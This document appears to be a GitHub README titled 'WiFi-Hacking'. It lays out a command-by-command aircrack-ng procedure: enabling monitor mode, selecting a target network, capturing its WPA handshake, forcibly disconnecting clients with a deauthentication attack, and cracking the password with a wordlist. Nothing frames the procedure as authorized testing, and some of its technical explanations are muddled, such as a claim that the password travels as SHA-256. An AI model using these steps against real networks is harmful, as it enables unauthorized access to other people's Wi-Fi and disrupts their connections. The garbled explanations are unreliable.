<h1 align="center">Welcome to WiFi-Hacking 👋</h1>
<p>
  <img src="https://img.shields.io/badge/version-0.1-blue.svg?cacheSeconds=2592000" />
</p>

> 
### 🏠 [Homepage](https://github.com/AnandKatariya/WiFi-Hacking)
## Check
```sh
iwconfig
```
Check weather the mode is on moniter mode or managed mode.
## Clear all stuff

```sh
airmon-ng check kill
```
check and kill off processes that might interfere with the aircrack-ng suite.
## Moniter mode

```sh
airmon-ng start wlan0
```
Airmon-ng is used to read all the packets of data even if they are not sent to us. It controls the traffic received only on the wired/wireless networks. Wi-Fi adapters are mainly used for connecting your device to the internet. Most laptops, tablets, and mobile phones have an inbuild Wi-Fi card.
## Search the target

```sh
airodump-ng wlan0mon
```
After doing this you will able to see a interface that will show you wifi network around you which are available and with this you will able to see many other columns such as CH (channel), bssid and many more.
## Select the target

```sh
airodump-ng wlan0mon -c <ch> --bssid <target_mac>
```
A wireless penetration test will examine your network using a methodology similar to the standard wired penetration test. However, they will focus on the wireless as the gateway to exploit your vulnerabilities. Thus this will select your target.
## Save handshake

```sh
airodump-ng wlan0mon -c <ch> --bssid <target_mac> -w target_handshake
```
-w will save save you target handshake whenever it will capture. It will save in .cap name file. Now after this we want to disconnect someone who is connected to target's device. So we need to perform the aireplay attack so we will able to disconnect the any device which is connect to target's device  
<br>
## Open new terminal
<br>
## Disconnecting the device

```sh
aireplay-ng --deauth 0 -a <target_mac> wlan0mon
```
After doing this any one of the device will be disconnect and will able to try auto reconnect to the target (when this process is been happeing the waay is when any device is disconnect it will try to auto reconnect it and when it will try the password will transfer in terms of packet and the packet will be
SHA-256 bit algorithm) when it it auto reconnect the packet will be capture and the 4-way handshake will be performed.
## Cracking the password

```sh
aircrack-ng -w wordlist.txt handshake.cap
```
This process will help you to crack the password of the file but all you need is the gigantic wordlist, which should contain lakhs of similar passwaord and Hence it will able to crack the password.
## Author

👤 **Anand Katariya**

* Github: [@AnandKatariya](https://github.com/AnandKatariya)

## 🤝 Contributing

Contributions, issues and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/AnandKatariya/WiFi-Hacking/issues).

## Show your support

Give a ⭐️ if this project helped you!
